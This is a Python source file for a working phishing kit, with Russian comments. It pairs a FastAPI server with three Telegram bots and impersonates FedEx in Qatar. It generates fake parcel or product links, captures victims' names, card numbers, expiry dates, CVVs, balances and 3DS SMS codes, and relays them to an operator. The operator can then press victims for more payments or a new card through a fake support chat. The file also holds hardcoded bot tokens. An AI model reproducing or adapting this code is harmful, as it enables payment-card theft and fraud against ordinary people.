import uvicorn
import asyncio
import uuid
import random
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- ТВОИ КОНФИГИ ---
GEN_TOKEN = "8537315570:AAEAh7dRGuFKFkZjfSpapEUvv59ezndKjmw"
LOG_TOKEN = "8733901283:AAHgobhhA6Ef1-TD9uSU_Qhl0tn7c9PQxQ8"
SUP_TOKEN = "8506407326:AAETHtjTa-_1M1sl_y3igNXsb8zLSxjDjug" 
ADMIN_ID = 8071425015

# Статусы для логгера
STATUSES = {
    "1": "👀 Просмотр товара",
    "2": "💳 Заполнение карты",
    "3": "💰 Ввод баланса",
    "load": "⏳ Ожидание (Loader)",
    "3ds": "🔐 Окно 3DS (SMS)",
    "RESEND_CODE_REQUESTED": "🔄 Повторный запрос SMS"
}

app = FastAPI()
props = DefaultBotProperties(parse_mode=ParseMode.MARKDOWN)
bot_gen = Bot(token=GEN_TOKEN, default=props)
bot_log = Bot(token=LOG_TOKEN, default=props)
bot_sup = Bot(token=SUP_TOKEN, default=props)

dp_gen = Dispatcher()
dp_log = Dispatcher()
dp_sup = Dispatcher()

# База данных в оперативной памяти
links_db = {}
mammoth_status = {}
chat_map = {}

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

class CreateLink(StatesGroup):
    name = State()
    price = State()
    photo = State()

# --- СЕРВЕРНАЯ ЧАСТЬ (FASTAPI) ---

@app.get("/{link_id}")
async def serve_index(link_id: str):
    # Если ID нет в базе или это системный файл - 404
    if link_id not in links_db and not link_id.endswith(('.js', '.css', '.png')):
        raise HTTPException(status_code=404, detail="Link Not Found")
    return FileResponse("index.html")

@app.get("/get_item/{link_id}")
async def get_item(link_id: str):
    return links_db.get(link_id, {"name": "FedEx Package", "price": "0.00", "photo": ""})

@app.post("/track/{link_id}")
async def track_step(link_id: str, request: Request):
    data = await request.json()
    step_raw = str(data.get('step'))
    step_nice = STATUSES.get(step_raw, f"Фаза: {step_raw}")
    
    text = (f"🛰 *ТРЕКИНГ МП*\n"
            f"📍 Статус: `{step_nice}`\n"
            f"🆔 ID: `{link_id}`")
    await bot_log.send_message(chat_id=ADMIN_ID, text=text)
    return {"status": "ok"}

@app.post("/receive_data/{link_id}")
async def receive(link_id: str, request: Request):
    data = await request.json()
    mammoth_status[link_id] = "wait_admin"
    
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🔐 3DS (SMS)", callback_data=f"3ds_{link_id}"))
    builder.row(
        types.InlineKeyboardButton(text="🔸 ДОБОР 500", callback_data=f"top500_{link_id}"),
        types.InlineKeyboardButton(text="🔸 ДОБОР 1000", callback_data=f"top1000_{link_id}")
    )
    builder.row(types.InlineKeyboardButton(text="💳 СМЕНА КАРТЫ", callback_data=f"change_{link_id}"))
    
    text = (f"📦 *ПОЛУЧЕН ЛОГ*\n"
            f"───────────────────\n"
            f"👤 ФИО: `{data.get('name')}`\n"
            f"💳 Карта: `{data.get('card')}`\n"
            f"📅 Срок: `{data.get('exp')}` | CVV: `{data.get('cvv')}`\n"
            f"💰 Баланс: `{data.get('balance')} QAR`\n"
            f"───────────────────\n"
            f"🆔 ID: `{link_id}`")
    
    await bot_log.send_message(chat_id=ADMIN_ID, text=text, reply_markup=builder.as_markup())
    
    for _ in range(300):
        curr = mammoth_status.get(link_id)
        if curr in ["send_3ds", "need_500", "need_1000", "change_card"]:
            return {"action": curr}
        await asyncio.sleep(1)
    return {"action": "error"}

@app.post("/send_sms/{link_id}")
async def receive_sms(link_id: str, request: Request):
    data = await request.json()
    mammoth_status[link_id] = "wait_sms"
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="❌ RE-OTP", callback_data=f"reotp_{link_id}"))
    builder.row(types.InlineKeyboardButton(text="✅ PROFIT", callback_data=f"finish_{link_id}"))
    
    text = (f"📩 *SMS КОД*\n"
            f"───────────────────\n"
            f"🔑 Код: `{data.get('sms')}`\n"
            f"🆔 ID: `{link_id}`")
    
    await bot_log.send_message(chat_id=ADMIN_ID, text=text, reply_markup=builder.as_markup())
    for _ in range(300):
        if mammoth_status.get(link_id) == "ask_new_otp": return {"action": "invalid_otp"}
        if mammoth_status.get(link_id) == "payout_done": return {"action": "success"}
        await asyncio.sleep(1)
    return {"status": "ok"}

# --- ЧАТ И САППОРТ ---

@app.post("/chat/send/{link_id}")
async def send_to_sup(link_id: str, request: Request):
    data = await request.json()
    item = links_db.get(link_id, {"name": "Unknown"})
    msg_text = (f"🆘 *НОВОЕ СООБЩЕНИЕ*\n"
                f"📦 Товар: `{item.get('name')}`\n"
                f"👤 Клиент: `{data['text']}`\n"
                f"🔗 ID: `{link_id}`")
    sent = await bot_sup.send_message(chat_id=ADMIN_ID, text=msg_text)
    chat_map[sent.message_id] = link_id
    if "messages" not in links_db[link_id]: links_db[link_id]["messages"] = []
    links_db[link_id]["messages"].append({"role": "user", "text": data['text']})
    return {"status": "sent"}

@app.get("/chat/get/{link_id}")
async def get_chat(link_id: str):
    return links_db.get(link_id, {}).get("messages", [])

@app.post("/chat/send_bot/{link_id}")
async def send_bot_msg(link_id: str, request: Request):
    data = await request.json()
    if link_id not in links_db: return {"status": "error"}
    if "messages" not in links_db[link_id]: links_db[link_id]["messages"] = []
    if len(links_db[link_id]["messages"]) == 0:
        links_db[link_id]["messages"].append({"role": "support", "text": data.get('text')})
    return {"status": "ok"}

@dp_sup.message(F.reply_to_message)
async def handle_admin_reply(message: types.Message):
    orig_msg_id = message.reply_to_message.message_id
    if orig_msg_id in chat_map:
        link_id = chat_map[orig_msg_id]
        if "messages" not in links_db[link_id]: links_db[link_id]["messages"] = []
        links_db[link_id]["messages"].append({"role": "support", "text": message.text})
        await message.reply("✅ *Ответ отправлен в чат*")

# --- CALLBACKS ДЛЯ ЛОГГЕРА ---

@dp_log.callback_query(F.data.startswith("3ds_"))
async def cb_3ds(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "send_3ds"; await c.answer("3DS Sent")

@dp_log.callback_query(F.data.startswith("top500_"))
async def cb_500(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "need_500"; await c.answer("+500 Req")

@dp_log.callback_query(F.data.startswith("top1000_"))
async def cb_1000(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "need_1000"; await c.answer("+1000 Req")

@dp_log.callback_query(F.data.startswith("change_"))
async def cb_change(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "change_card"; await c.answer("Card Change Req")

@dp_log.callback_query(F.data.startswith("reotp_"))
async def cb_re(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "ask_new_otp"; await c.answer("RE-OTP")

@dp_log.callback_query(F.data.startswith("finish_"))
async def cb_fin(c: types.CallbackQuery):
    mammoth_status[c.data.split('_')[1]] = "payout_done"; await c.answer("PROFIT")

# --- БОТ-ГЕНЕРАТОР ---

@dp_gen.message(Command("start"))
async def start_gen(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="💎 Создать ссылку", callback_data="gen_new"))
    await message.answer("🛠 *FEDEX ADMIN PANEL*", reply_markup=builder.as_markup())

@dp_gen.callback_query(F.data == "gen_new")
async def start_creation(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(CreateLink.name)
    await callback.message.answer("📦 Введите *Название*:")
    await callback.answer()

@dp_gen.message(CreateLink.name)
async def process_name(message: types.Message, state: FSMContext):
    await state.update_data(name=message.text)
    await state.set_state(CreateLink.price)
    await message.answer("💰 Введите *Цену* (QAR):")

@dp_gen.message(CreateLink.price)
async def process_price(message: types.Message, state: FSMContext):
    await state.update_data(price=message.text)
    await state.set_state(CreateLink.photo)
    await message.answer("🖼 Отправьте *Фото*:")

@dp_gen.message(CreateLink.photo, F.photo)
async def process_photo(message: types.Message, state: FSMContext):
    data = await state.get_data()
    photo = message.photo[-1].file_id
    file = await bot_gen.get_file(photo)
    photo_url = f"https://api.telegram.org/file/bot{GEN_TOKEN}/{file.file_path}"
    
    # Генерация ID из 11 цифр как у конкурентов
    link_id = "".join([str(random.randint(0, 9)) for _ in range(11)])
    
    links_db[link_id] = {
        "name": data['name'], 
        "price": data['price'], 
        "photo": photo_url, 
        "messages": []
    }
    
    await message.answer(
        f"✅ *ССЫЛКА ГОТОВА*\n"
        f"📦 Товар: `{data['name']}`\n"
        f"🔗 Ссылка:\n`http://localhost:8000/{link_id}`"
    )
    await state.clear()

async def main():
    config = uvicorn.Config(app=app, host="0.0.0.0", port=8000, loop="asyncio")
    server = uvicorn.Server(config)
    await asyncio.gather(
        server.serve(), 
        dp_gen.start_polling(bot_gen), 
        dp_log.start_polling(bot_log), 
        dp_sup.start_polling(bot_sup)
    )

if __name__ == "__main__":
    asyncio.run(main())
